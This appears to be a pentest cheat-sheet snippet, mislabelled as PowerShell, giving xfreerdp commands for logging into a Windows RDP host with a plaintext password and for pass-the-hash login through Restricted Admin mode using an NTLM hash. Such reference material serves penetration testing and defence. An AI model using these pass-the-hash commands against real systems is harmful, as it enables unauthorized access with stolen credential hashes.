---
id: 1df68a18-5f54-4f64-853e-5c791845dbc5
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:31.072422+00:00'
updated_at: '2023-04-10T20:38:03.097950+00:00'
---

# Code Snippet 1df68a18

**Language**: Powershell

```powershell
root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked

# pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
# pass the hash works for Server 2012 R2 / Win 8.1+
# require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11
root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
```


